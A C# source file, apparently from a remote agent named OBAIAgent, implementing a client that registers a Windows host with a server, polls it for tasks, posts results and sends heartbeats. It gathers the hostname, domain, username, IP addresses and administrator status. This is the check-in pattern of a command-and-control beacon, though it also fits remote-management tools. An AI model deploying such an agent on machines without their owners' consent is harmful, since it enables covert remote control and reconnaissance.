using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using OBAIAgent.Models;

namespace OBAIAgent;

public class AgentClient : IDisposable
{
    private readonly HttpClient _http;
    private readonly string _baseUrl;
    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        PropertyNamingPolicy = JsonNamingPolicy.SnakeCaseLower,
        WriteIndented = false,
    };

    public AgentClient(string baseUrl)
    {
        _baseUrl = baseUrl;
        _http = new HttpClient
        {
            Timeout = TimeSpan.FromSeconds(90),
        };
    }

    public async Task<string> RegisterAsync(CancellationToken ct)
    {
        var info = GatherRegistrationInfo();
        int retries = 0;

        while (true)
        {
            try
            {
                var json = JsonSerializer.Serialize(info, JsonOpts);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var resp = await _http.PostAsync($"{_baseUrl}/api/remote/register", content, ct);
                resp.EnsureSuccessStatusCode();

                var body = await resp.Content.ReadAsStringAsync(ct);
                var result = JsonSerializer.Deserialize<RegisterResponse>(body, JsonOpts);
                return result?.AgentId ?? throw new Exception("No agent_id in response");
            }
            catch (OperationCanceledException) { throw; }
            catch (Exception ex)
            {
                retries++;
                int delay = Math.Min(retries * 3, 30);
                Program.Log($"Registration failed ({ex.Message}), retry in {delay}s...", ConsoleColor.Yellow);
                await Task.Delay(delay * 1000, ct);
            }
        }
    }

    public async Task<TaskMessage?> PollAsync(string agentId, CancellationToken ct)
    {
        try
        {
            using var pollCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            pollCts.CancelAfter(TimeSpan.FromSeconds(60));

            var resp = await _http.GetAsync(
                $"{_baseUrl}/api/remote/{agentId}/poll?timeout=30",
                pollCts.Token
            );
            resp.EnsureSuccessStatusCode();

            var body = await resp.Content.ReadAsStringAsync(ct);
            var poll = JsonSerializer.Deserialize<PollResponse>(body, JsonOpts);

            if (poll is { HasTask: true, Task: not null })
                return poll.Task;

            return null;
        }
        catch (OperationCanceledException) when (!ct.IsCancellationRequested)
        {
            return null;
        }
    }

    public async Task PostResultAsync(string agentId, TaskResult result, CancellationToken ct)
    {
        var json = JsonSerializer.Serialize(result, JsonOpts);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        for (int attempt = 0; attempt < 3; attempt++)
        {
            try
            {
                var resp = await _http.PostAsync(
                    $"{_baseUrl}/api/remote/{agentId}/result",
                    content, ct
                );
                resp.EnsureSuccessStatusCode();
                return;
            }
            catch (OperationCanceledException) { throw; }
            catch
            {
                if (attempt < 2)
                    await Task.Delay(1000 * (attempt + 1), ct);
            }
        }

        Program.Log("Failed to deliver result after 3 attempts", ConsoleColor.Red);
    }

    public async Task HeartbeatAsync(string agentId, CancellationToken ct)
    {
        try
        {
            var resp = await _http.PostAsync(
                $"{_baseUrl}/api/remote/{agentId}/heartbeat",
                new StringContent("{}", Encoding.UTF8, "application/json"),
                ct
            );
            resp.EnsureSuccessStatusCode();
        }
        catch (Exception ex)
        {
            Program.Log($"Heartbeat failed: {ex.Message}", ConsoleColor.DarkYellow);
        }
    }

    private static RegisterRequest GatherRegistrationInfo()
    {
        var ips = new List<string>();
        try
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus != OperationalStatus.Up) continue;
                foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                {
                    if (addr.Address.AddressFamily == AddressFamily.InterNetwork)
                        ips.Add(addr.Address.ToString());
                }
            }
        }
        catch { }

        bool elevated = false;
        try
        {
            using var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            elevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch { }

        return new RegisterRequest
        {
            Hostname = Environment.MachineName,
            Domain = Environment.UserDomainName,
            Username = Environment.UserName,
            OsVersion = Environment.OSVersion.ToString(),
            IpAddresses = ips,
            IsElevated = elevated,
            DotnetVersion = Environment.Version.ToString(),
        };
    }

    public void Dispose() => _http.Dispose();
}
